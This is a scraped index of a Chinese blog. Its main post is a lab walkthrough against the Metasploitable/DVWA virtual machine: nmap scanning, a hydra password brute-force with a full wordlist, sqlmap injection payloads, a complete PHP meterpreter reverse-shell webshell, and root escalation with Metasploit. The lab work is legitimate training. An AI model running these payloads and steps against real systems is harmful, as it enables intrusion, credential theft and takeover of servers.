printf(\"输入你的身高(单位:厘米)\"); printf(\"\\n\\n:\"); scanf(\"%d\",\u0026height); weight = (int) Count_F((float) height); printf(\"你的身高对应的标准体重为%dkg\\n\",weight); printf(\"请输入你的实际体重(单位:kg)\"); printf(\"\\n:\"); scanf(\"%d\",\u0026real_weight); judge((float) real_weight,(float) weight); } return 0; } /*计算出男性标准体重*/ float Count_M(float parameter) { /*男性：(身高cm－80)×70﹪=标准体重*/ /*定义变量:结果*/ float result; result = (int)(parameter - 80.0) * 0.7; return result; } /*计算出女性标准体重*/ float Count_F(float parameter) { /*女性：(身高cm－70)×60﹪=标准体重*/ /*定义变量:结果*/ float result; result = (int)(parameter - 70.0) * 0.6; return result; } /*检测实际体重是否符合标准*/ float judge(float parameter1,float parameter2) { /*标准体重正负10﹪为正常体重*/ if(parameter1 \u003c= parameter2 + parameter2 * 0.1 \u0026\u0026 parameter1 \u003e= parameter2 - parameter2 * 0.1) { printf(\"你的体重符合正常标准\"); } /*标准体重正负10﹪~ 20﹪为体重过重或过轻*/ else if(parameter1 \u003e= parameter2 + parameter2 * 0.1 \u0026\u0026 parameter1 \u003c= parameter2 + parameter2 * 0.2) { printf(\"你的体重过重\"); } /*标准体重正负10﹪~ 20﹪为体重过重或过轻*/ else if(parameter1 \u003c= parameter2 - parameter2 * 0.1 \u0026\u0026 parameter1 \u003e= parameter2 - parameter2 * 0.2) { printf(\"你的体重过轻\"); } /*标准体重正负20﹪以上为肥胖或体重不足*/ else if(parameter1 \u003e parameter2 + parameter2 * 0.2) { printf(\"你太胖了。\"); } /*标准体重正负20﹪以上为肥胖或体重不足*/ else if(parameter1 \u003c parameter2 - parameter2 * 0.2) { printf(\"你太瘦了。\"); } return 0; } ","date":"2020-03-29","objectID":"/zh-cn/posts/%E4%B8%80%E4%B8%AAc%E8%AF%AD%E8%A8%80%E7%9A%84%E5%B0%8F%E7%A8%8B%E5%BA%8F/:2:0","tags":["C语言","编程"],"title":"一个C语言的小程序","uri":"/zh-cn/posts/%E4%B8%80%E4%B8%AAc%E8%AF%AD%E8%A8%80%E7%9A%84%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"categories":["渗透测试"],"content":"新人过审核的参考教程","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"注意事项：本期内容中的IP地址可能与你的实际情况不同！！请根据实际情况更改对应IP地址！！ ","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:0:0","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"开场白 诶嘿～！我又回来了，我看到很多萌新不知道怎么过锏幕的新人测试，特意为此写篇博客做个教程。 好让你们看完过一下，那么… 嘛.. 我们开始吧.. ","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:1:0","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"考核内容 类型 内容 备注 名称 锏幕四项萌新考核 考核的名称 难度 Low 难度系数 第一关 简单破解Web表单 必须通过，否则无法进行下一关 第二关 简单SQL注入 必须通过 第三关 操作系统渗透 必须通过 第四关 获取root权限 必须通过 PS：锏幕组织的新人考核是以metasploitable作为标准的，因此我会写出如何准备环境 ","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:2:0","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"环境准备 上面已经说明了需要用到metasploitable，那么接下来我会写出如何配置靶机环境 ","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:3:0","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"第一步|下载\u0026解压 首先我们需要去下载metasploitable这个靶机套餐的虚拟机文件，我们可以在各种搜索引擎中找到它我这里会给出地址。 点击这里可以下载 点进去以后点击那个巨大的Download即可下载。 嘛..我已经下载好了，是个zip文件。 然后你需要解压，两种方法: Linux unzip命令 file-roller(GUI) Windows 各种解压软件 这个不用多说吧.. 解压个东西都不会还想加入锏幕? 解压完了就可以进行下一步了。 ","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:3:1","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"第二步|创建虚拟机 你打开文件夹就可以看到这里面有个虚拟机配置文件和一个虚拟硬盘文件，它可以直接用VMware导入运行，因此我这里给出VirtualBox的方法 首先，打开你的VirtualBox 然后点击上面的新建…(这个还要教吗?) 然后选择的虚拟机类型和操作系统版本，这里要注意！！必须选“64位的其他Linux”，并且设置至少256MB的内存！否则无法启动！ 然后这里就不用创建虚拟硬盘了，我们选择使用现有的虚拟硬盘文件。 点击这个东西， 然后点击注册 找到你的metasploitable目录并且找到这个vmdk文件，这个就是虚拟硬盘文件。 点击打开，然后就会回到这个窗口，选择你刚刚注册的虚拟硬盘。 接下来就可以创建了 在启动之前要把虚拟机的联网改成桥接 依次点击设置——网络 然后就会跳出这个页面 将它改成桥接网卡即可 最后启动虚拟机，你的靶机环境就搭建完成了。 开机之后不要去操作靶机也不要去理会它 ","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:3:2","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"考核过程 现在环境已经准备完毕了，我们可以开始进行过关了。接下来请认真看！认真看！认真看！（重要的事情说三遍） ","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:4:0","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"嗅探！扫描！ 我们刚刚搭建完靶机却不知道它的IP地址，这意味着我们不知道它的位置，那么怎么办呢？这个时候我们要用到nmap把他扫出来。 不过前提是首先你得知道你所处的IP段，我的环境是局域网，DHCP地址段是192.168.0.1/24 执行 $ sudo nmap -v -O 192.168.0.1/24 ![](/img/截图_2019-10-20_06-27-08.png) 可以发现它很快就扫出来了 终端里获取到的信息如下，说明这个192.168.0.107就是靶机的地址 Nmap scan report for 192.168.0.107 Host is up (0.00028s latency). Not shown: 977 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 23/tcp open telnet 25/tcp open smtp 53/tcp open domain 80/tcp open http 111/tcp open rpcbind 139/tcp open netbios-ssn 445/tcp open microsoft-ds 512/tcp open exec 513/tcp open login 514/tcp open shell 1099/tcp open rmiregistry 1524/tcp open ingreslock 2049/tcp open nfs 2121/tcp open ccproxy-ftp 3306/tcp open mysql 5432/tcp open postgresql 5900/tcp open vnc 6000/tcp open X11 6667/tcp open irc 8009/tcp open ajp13 8180/tcp open unknown MAC Address: 08:00:27:3F:40:18 (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.9 - 2.6.33 Uptime guess: 0.002 days (since Sun Oct 20 06:23:17 2019) Network Distance: 1 hop TCP Sequence Prediction: Difficulty=192 (Good luck!) IP ID Sequence Generation: All zeros 那么我已经找到靶机了，接下来就可以正式进行攻击了。 ","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:4:1","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"第一关|简单破解Web表单 接下来我们在浏览器输入刚刚扫描到的地址，就可以进入靶机上的网页了。 小白：唔？为什么你的IP不是上面写的107了，变成4了 回答：我写着写着就断网了，搭建了一个虚拟局域网，所以靶机IP变了，又重新扫了一遍。。但是正常情况下，这个IP是不会变的，所以请无视这个地址具体是多少了，每个人都不一样的。 接下来我们点击DVWA，进入了一个这样的帐号密码登录页面，我们第一关的目的就是破解它。 QwQ，然后..是不是到这里就一脸懵逼了 抓包 嘛，记得Burpsuite吗？ 就是一个java写的软件 试试？ 在使用Burpsuite之前，你需要给浏览器设置burp的代理，我这里使用的是firefox 那么，在burpsuite里面依次点击 Proxy（左上角内个）——Options 从这里我们就获得了burp默认的代理地址127.0.0.1:8080 接下来要到浏览器里设置它， 简单地给出截图吧 然后点确定，就这样设置好了 嘛…浏览器都不会用的也别来锏幕了 然后回到burp，确认一下这个Intercept是否为on，如果是就进行下一步操作，如果不是就点一下。。。 接下来，回到浏览器 emmmm….我们知道一般网站的默认管理员帐号都是admin，这里也不例外，接下来我们试着在Username这个框框里输入admin，Password这个框框里随便输入点什么 然后点击login。 接下来我们就抓取到了这个数据包了，下面还有我输入过的信息 POST /dvwa/login.php HTTP/1.1 Host: 192.168.0.4 User-Agent: Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 46 Connection: close Referer: http://192.168.0.4/dvwa/login.php Cookie: security=high; PHPSESSID=091eeaf25f53c1c6c6dd230cd5add7be Upgrade-Insecure-Requests: 1 username=admin\u0026password=6666666666\u0026Login=Login 嘛…这么一大堆看着都头晕 诶嘿，其实这里你只需要保存这一部分就可以了 username=admin\u0026password=6666666666\u0026Login=Login 嘛，上面这点还不够呢，还需要获取一段信息。 现在网页看起来像时间停止了一样一动不动的对不对？ 那么我来解释一下burp这里三个按钮的意思 Forward:放行，让网页继续执行抓到的数据包 Drop:丢弃，将这个数据包扔了，网页就执行不了了 现在，我们点击Forward，放行这个数据包 这时，网页下面弹出了一段字符串 码下来，一会儿要用到的 Login failed 接下来把burpsuite关掉，浏览器代理关掉，这个不多说步骤了。 嗯…整个抓包的过程就完成了。然后就是进行爆破了 爆破 嘛…最精彩的部分来了 你知道hydra吗？如果不知道那么请出门左转用搜索引擎查一下。 我们要给hydra设置这么几个参数 -l + 用户名 : 这个是设置需要破解的用户名，我们尝试admin -P 密码字典 : 指定一个txt文件，里面都是依次猜测需要的密码 -V : 显示详细过程 -n es : 尝试空口令登录 IP地址 : 也就是目标的地址咯，上面的192.168.0.4 http-post-form : 指定爆破类型，后面还要加爆破的页面地址，这里是http的post页面 没有密码字典？我这里提供一个，你自己复制进一个txt文件里就可以了。 123456 12345 123456789 Password iloveyou princess rockyou 1234567 12345678 abc123 admin888 admin123 test password 123456 a123456 123456a 5201314 111111 woaini1314 qq123456 123123 0 1qaz2wsx 1q2w3e4r qwe123 7758521 123qwe a123123 123456aa woaini520 woaini 100200 1314520 woaini123 123321 q123456 123456789 123456789a 5211314 asd123 a123456789 z123456 asd123456 a5201314 aa123456 zhang123 aptx4869 123123a 1q2w3e4r5t 1qazxsw2 5201314a 1q2w3e aini1314 31415926 q1w2e3r4 123456qq woaini521 1234qwer a111111 520520 iloveyou abc123 110110 111111a 123456abc w123456 7758258 123qweasd 159753 qwer1234 a000000 qq123123 zxc123 123654 abc123456 123456q qq5201314 12345678 000000a 456852 as123456 1314521 112233 521521 qazwsx123 zxc123456 abcd1234 asdasd 666666 love1314 QAZ123 aaa123 q1w2e3 aaaaaa a123321 123000 11111111 12qwaszx 5845201314 s123456 nihao123 caonima123 zxcvbnm123 wang123 159357 1A2B3C4D asdasd123 584520 753951 147258 1123581321 110120 qq1314520 123456.com 123123 idc123!@# 123 aaa123!@# qq123.com 123456 wantian##*( qwe123 qwe1234 123qwe 123qwer 1qaz2wsx 1qaz 159753 !Q@W#E 159357 147369 1234567 password aistar123\u003c\u003e!N 321 idcji2010 qqqqqq 1q2w3e q1w2e3 336699 abc123 asd123 123654 1 111111 111 111qqq... 123456 953139. 0258 111qqq!!! 1236 qqii tyinfo abcd36888 rst_login OAOidc OAOidc123!@# OAOidc123 esin888 qwer power123 power.liu power.yu dns99+588 zhengui idc0.1 7715123 sdwer power.zhao sdwer123 qwer1234 esincs jspower123.0 5656789 2323456 power.com power123.0 power0.123 jspower.com 123123 hlwj0519-1205.jf 123321 zaxscdvf ..0 !@#$QWER 95313 1231321 321123 vipnew idc0514 1235698 235689 326598 112233 111222 qqqqqq idc11 21vianet #@!ewq 1010 111qqq 1234%^\u0026* 12345^\u0026*() 123456 4867086 1234567 123!@# 123456!@# 10000 794613 784512 895623 789456 456123 654321 123!@# 1234!@#$ 11185 12345!@#$% qwe123!@# !@#123 !@#321 123#@! 19861212 19831212 19841020 #@!123 #@!321 idcidc 12345^\u0026*() !@#$%^\u0026*() )(*\u0026^%$#@! 0987654321 tyidc 1122 111222 idc123 idcidcok idcuser abcd1234 1234abcd caonima 1q2w3e4r 888888 admin!@# abc!@# !Q@W#E$R%T idc2010 1236 1q2w3e4r5t qqaazz asdasd admin admin1 admin123 aaa111 111aaa 123aaa lh222 lhidc 123a a123 123456a a123456 aaa123 qazwsx qazxsw 0123 1","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:4:2","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"第二关|简单SQL注入 第一关过了以后，我们要看看它的数据库里面有什么 抓包 我们回到他这个网页，先进入DVWA Security，把安全等级改成Low 再点击SQL Injection这个按钮，进入这个页面。 接下来打开burp，按照之前的操作一样，监听，抓包什么的（这里我上面写得很详细了） 在burpsuite的监听下，在这个输入框里随便输入一些内容，然后点击这个Submit按钮，Burp就会自动抓包了 将它保存为一个txt文件，但是要记住它的位置，比如我的是~/get.txt 这样抓包工作就完成了。 使用sqlmap注入 接下来用到的工具就是sqlmap了，这里只写出注入的流程，具体的教程请参考由帝的视频 我们先扫描一下注入点 $ sqlmap -r \"get.txt\" 这里均选y即可。 最后一个选项选n不必浪费时间了。 接下来我们就获得我们需要的信息了，数据库版本什么的。我把它贴出来吧。 sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests: --- Parameter: id (GET) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment) Payload: id=6666666' OR NOT 1144=1144#\u0026Submit=Submit Type: error-based Title: MySQL \u003e= 4.1 OR error-based - WHERE or HAVING clause (FLOOR) Payload: id=6666666' OR ROW(6268,9799)\u003e(SELECT COUNT(*),CONCAT(0x7162786b71,(SELECT (ELT(6268=6268,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM (SELECT 9569 UNION SELECT 7660 UNION SELECT 7717 UNION SELECT 8645)a GROUP BY x)-- dPXL\u0026Submit=Submit Type: time-based blind Title: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP) Payload: id=6666666' AND (SELECT 4811 FROM (SELECT(SLEEP(5)))hDuM)-- SMOw\u0026Submit=Submit Type: UNION query Title: MySQL UNION query (NULL) - 2 columns Payload: id=6666666' UNION ALL SELECT NULL,CONCAT(0x7162786b71,0x794f4b67535851624375466379624550476a6243584e4b754d7250524e524d7a6c70587370704877,0x716a767071)#\u0026Submit=Submit --- [13:19:30] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL \u003e= 4.1 [13:19:30] [INFO] fetched data logged to text files under '/home/weepingdogel/.sqlmap/output/192.168.0.105' 接下来我们就要查看数据库里面的内容了，由于原因，我就不贴出逐级查看的代码了，我直接dump $ sqlmap -r \"~/get.txt\" --dump 出来了。 如果你终端里获取到了以下信息，那么说明，第二关通过了 Database: dvwa Table: users [5 entries] +---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+ | user_id | user | avatar | password | last_name | first_name | +---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+ | 1 | admin | http://172.16.123.129/dvwa/hackable/users/admin.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin | | 2 | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon | | 3 | 1337 | http://172.16.123.129/dvwa/hackable/users/1337.jpg | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack | | 4 | pablo | http://172.16.123.129/dvwa/hackable/users/pablo.jpg | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo | | 5 | smithy | http://172.16.123.129/dvwa/hackable/users/smithy.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob | +---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+ ","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:4:3","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"第三关|操作系统渗透 Well, 接下来我们就要进行最关键的一环了，我们将使用Webshell的方式入侵靶机的操作系统。 知道PHP吗？我对它了解也不是很多，总之它可以被上传到服务器然后以可执行文件的方式运行。 这次也将使用PHP文件作为木马进行攻击。 生成木马 我们用 msfvenom 这个命令来生成。执行 $ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=4444 -o test.php 这样就生成好了。来看看里面有什么？ /*\u003c?php /**/ error_reporting(0); $ip = '192.168.0.106'; $port = 4444; if (($f = 'stream_socket_client') \u0026\u0026 is_callable($f)) { $s = $f(\"tcp://{$ip}:{$port}\"); $s_type = 'stream'; } if (!$s \u0026\u0026 ($f = 'fsockopen') \u0026\u0026 is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s \u0026\u0026 ($f = 'socket_create') \u0026\u0026 is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(\"Nlen\", $len); $len = $a['len']; $b = ''; while (strlen($b) \u003c $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') \u0026\u0026 ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die(); 只有一行～！这一行就是嘿嘿。。。自己看啦 我们加一些html上去吧: /*\u003c?php /**/ error_reporting(0); $ip = '192.168.0.106'; $port = 4444; if (($f = 'stream_socket_client') \u0026\u0026 is_callable($f)) { $s = $f(\"tcp://{$ip}:{$port}\"); $s_type = 'stream'; } if (!$s \u0026\u0026 ($f = 'fsockopen') \u0026\u0026 is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s \u0026\u0026 ($f = 'socket_create') \u0026\u0026 is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(\"Nlen\", $len); $len = $a['len']; $b = ''; while (strlen($b) \u003c $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') \u0026\u0026 ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();?\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eHacked\u003c/h1\u003e \u003c/body\u003e \u003c/html\u003e 接下来回到DVWA，在左下角点击 upload 进入上传页面，然后点击 选择文件 再点击 upload 即可。 将这个文件上传进去。 如果这都不会我就不多说了，你连上传个文件都不会还想进锏幕？ 然后我们可以看到这么一串东西。 ../../hackable/uploads/test.php succesfully uploaded! 说明你上传成功了，接下来要用到msf 我们在终端进入msf: $ sudo msfconsole 不多讲了，走个命令流程，之前写过 调用模块: msf5 \u003e use exploit/multi/handler 按顺序执行: msf5 exploit(multi/handler) \u003e set lhost 192.168.0.106 msf5 exploit(multi/handler) \u003e set lport 4444 msf5 exploit(multi/handler) \u003e set payload php/meterpreter/reverse_tcp msf5 exploit(multi/handler) \u003e run 执行完后，如图: 接下来，我们会到浏览器，直接访问http://192.168.0.105/dvwa/hackable/uploads/test.php 这时，msf会收到反弹，如图: 可见权限小得可怜，不过也第三关就这样通过了。权限的问题我们会在第四关解决 ","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:4:4","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"第四关|获取root权限 你能做到这里说明你已经不是萌新了，最后一关：提权 这是最关键的一环，那么我们开始吧。 首先把我们刚刚获取的webshell放到后台: meterpreter \u003e background 然后我们使用这个模块exploit/linux/local/udev_netlink(用别的也可以，我个人喜欢用这个:) msf5 exploit(multi/handler) \u003e use exploit/linux/local/udev_netlink 模块的信息你可以自己输入 info 这个命令去查看， 然后我们设置刚刚webshell的session号，我的是2: msf5 exploit(linux/local/udev_netlink) \u003e set SESSION 2 最后执行 run 或者 exploit : msf5 exploit(linux/local/udev_netlink) \u003e exploit 这样我们就获取到最高权限了，如图: 我们来看看用户是不是root meterpreter \u003e getuid 或 meterpreter \u003e shell whoami 如图 然后，我们就通过了第四关，同时也通过了全部考核，接下来只要取证和提交截图就可以成为锏幕核心成员了。 ","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:4:5","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"结语 写了一个礼拜，全是即操作即写 看完还不会的，，，在下面留言吧.. ","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:5:0","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["渗透测试"],"content":"参考链接 ArchWiki Metasploitable下载地址 由帝的sqlmap视频 注意：转载请注明出处，禁止用本博客去干一些作死的事情，否则后果自负，与我无关 ","date":"2019-10-20","objectID":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/:6:0","tags":["笔记","Linux","渗透测试","黑客"],"title":"锏幕 新人测试教程","uri":"/zh-cn/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/"},{"categories":["Web"],"content":"利用Github Pages创建全静态网页。","date":"2019-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/","tags":["笔记","HTML","Github Pages","Website","建站"],"title":"如何使用 GitHub 搭建网站","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"不正经的前言 我又回来啦～ 嘿嘿，我绝对不会告诉你我又回来水啦～ 啊啊别打我～疼 ","date":"2019-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:1:0","tags":["笔记","HTML","Github Pages","Website","建站"],"title":"如何使用 GitHub 搭建网站","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"Github是啥 某个萌新:大佬大佬，Github是啥？ 大佬:不知道，滚。 萌新:呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜呜大佬不帮我了呜呜呜呜呜呜呜 咳咳，，，， Github是一个基于git的源代码托管平台，由Chris Wanstrath, PJ Hyett 与Tom Preston-Werner三位开发者在2008年4月创办。迄今拥有59名全职员工，主要提供基于git的版本托管服务。 也常常被人戏称为Gayhub。2333 今天，GitHub已是： 一个拥有143万开发者的社区。其中不乏Linux发明者Torvalds这样的顶级黑客，以及Rails创始人DHH这样的年轻极客。 这个星球上最流行的开源托管服务。目前已托管431万git项目，不仅越来越多知名开源项目迁入GitHub，比如Ruby on 